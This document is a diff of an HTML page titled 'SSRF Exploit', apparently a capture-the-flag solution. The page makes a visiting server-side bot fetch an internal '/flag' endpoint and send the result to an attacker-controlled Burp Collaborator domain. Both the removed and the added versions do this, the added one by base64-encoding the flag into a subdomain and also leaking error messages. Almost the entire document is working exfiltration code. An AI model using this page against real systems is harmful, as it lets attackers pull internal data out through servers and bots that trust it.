@@ -1,13 +1,44 @@
+<!DOCTYPE html>
 <html>
-  <script>
-(async () => {
-  const flag = await fetch('https://tar-award-writers-controllers.trycloudflare.com//flag').then(r => r.text());
+<head>
+    <title>SSRF Exploit</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    <script>
+        // --- CONFIGURATION ---
+        // 1. Replace this with your actual Burp Collaborator domain.
+        const collaboratorDomain = "fp87ezebetbwakkum9x441onxe35r0fp.oastify.com";
 
-  await fetch('https://d2g5rxr9rrounixsz7a2hz1lacg34xsm.oastify.com/flag', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: flag
-  });
-})();
-</script>
+        async function exfiltrateFlag() {
+            try {
+                // Step 1: Fetch the flag from the server's internal endpoint.
+                // Since this script is executed by the bot on the server, '/flag'
+                // resolves to 'https://tar-award-writers-controllers.trycloudflare.com/flag'
+                const response = await fetch('/flag');
+                const flag = await response.text();
+
+                // Step 2: Base64-encode the flag to ensure it's safe for a URL.
+                // Using btoa() which is a simple way to encode in the browser.
+                const encodedFlag = btoa(flag.trim());
+
+                // Step 3: Construct the exfiltration URL.
+                // The flag will appear as a subdomain in your Collaborator logs.
+                // We add a prefix to make it easier to spot.
+                const exfilUrl = `https://flag-${encodedFlag}.${collaboratorDomain}`;
+
+                // Step 4: Send the flag to your Collaborator server.
+                // We don't care about the response, we just need the request to be made.
+                await fetch(exfilUrl);
+
+            } catch (error) {
+                // If something goes wrong, send an error message to the Collaborator.
+                const errorUrl = `https://error-${btoa(error.message)}.${collaboratorDomain}`;
+                await fetch(errorUrl);
+            }
+        }
+
+        exfiltrateFlag();
+    </script>
+</body>
 </html>
